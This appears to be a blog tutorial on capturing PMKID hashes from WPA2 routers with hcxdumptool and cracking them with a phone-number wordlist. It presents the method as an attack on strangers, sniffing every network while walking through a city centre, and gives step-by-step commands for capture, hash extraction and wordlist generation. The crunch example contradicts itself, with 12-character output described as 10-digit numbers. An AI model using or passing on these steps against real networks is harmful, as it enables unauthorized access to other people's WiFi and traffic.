# Cracking Wifi at Scale with hcxdumptool
Usually when a hacker wants to crack a WiFi password, he needs a full live four-way handshake between a client and the router, hoping the password entered by the client is the right one, this method of cracking wifi can be time consuming too since you need to wait for a client to actually attempts to connect to his router (usually we use deauthentication to accelerate the process).

All of this changed in 2018 when [atom's](https://hashcat.net/forum/thread-7717.html) accidentally discovered a new way to crack WPA2 while searching for new ways to crack the new WPA3 security standard (GO READ HIS RESEARCH !).

Atom's technique is clientless, making the need to capture a user's login in real time and the need for users to connect to the network at all **obsolete**. Furthermore, it only required the attacker to capture a single frame and **eliminate the wrong passwords and malformed frames that are disturbing the cracking process**.

This means we do not need to wait for people connecting to their routers for this attack to be successful. We just need a PMKID hash and try to crack it.

To crack a PMKID hash generated and what elements does it contain

![PMKID Hash](https://i.imgur.com/NlZfEOP.png)

The hash calculation might seem daunting at first glance but let us dive into it.

![](https://i.imgur.com/xx4Xlme.png)

**The PMK is computed as follows:**

![](https://i.imgur.com/zTGtXyD.png)

After a PMK was generated we can generate a PMKID.

**The PMKID is computed as follows :**

![](https://i.imgur.com/6oEJGPz.png)

![](https://i.imgur.com/ODQeVSz.png)

## Sniffing PMKID
To gather PMKID hashes, we need a wireless network interface that has monitor mode capabilities. Monitor mode allows packet capturing without having to associate with an access point.

For this i'll use the [AWUS036ACH from ALFA Network](https://www.alfa.com.tw/products/awus036ach?variant=36473965871176) which supports monitor mode and went inside the center of my city.

My machine is running arch linux (kernel 5.16.4-arch1-1), the instructions are pretty similar for debian based distributions.
#### Installing Drivers
```
git clone -b v5.6.4.2 https://github.com/aircrack-ng/rtl8812au
cd rtl8812au
make && sudo make install
```
#### Installing Hcxdumptool
```
sudo pacman -S hcxdumptool
```
#### Preparing Network
For the sniffing to work properly we will need to stop services that might interfere with hcxdumptool.
```
sudo systemctl stop wpa_supplicant
sudo systemctl stop NetworkManager
sudo airmon-ng check-kill
```

*Note that it is not required to start monitor mode prior to hcxdumptool execution, since hcxdumptool will automatically make the use of syscalls and turn the interface in monitor mode by itself.*
#### Starting the sniffing with hcxdumptool
```
sudo hcxdumptool -i wlan1 -o PMKID_CAP1.pcapng --disable_deauthentication --disable_client_attacks --enable_status=3
```

*Now wear a hoody, because you will get a PMKID of every network you cross by that is vulnerable to the attack*.

![](https://i.imgur.com/hM1pzNY.png)

## Cracking Time
Now time for the last part of this sniffing attack, we will extract the hashes from our pcapng capture with the hcxpcapngtool.
```
hcxpcapngtool -o Hashes.txt PMKID_CAP1.pcapng
```
This command will produce a hash file that each line takes on the following structure :
```
SIGNATURE*TYPE*PMKID/MIC*MACAP*MACSTA*ESSID***
```
#### Install Hashcat
Installing hashcat on arch can be easily done with the following command
```
sudo pacman -S hashcat
```

#### Start Cracking Procedure
You can generate a wordlists of all the phone network for a region identifier using crunch. If my region identifier is 450 then i would use the following command
```
crunch 12 12 0123456789 -t 450@@@@@@@@@ -o phones.txt
```
The preceding command will generate a wordlist (phones.txt) with phone numbers starting from 4500000000 all the way up to 4509999999.

A lot of people are using their phone numbers as password, you can easily crack these networks with this simple trick :)
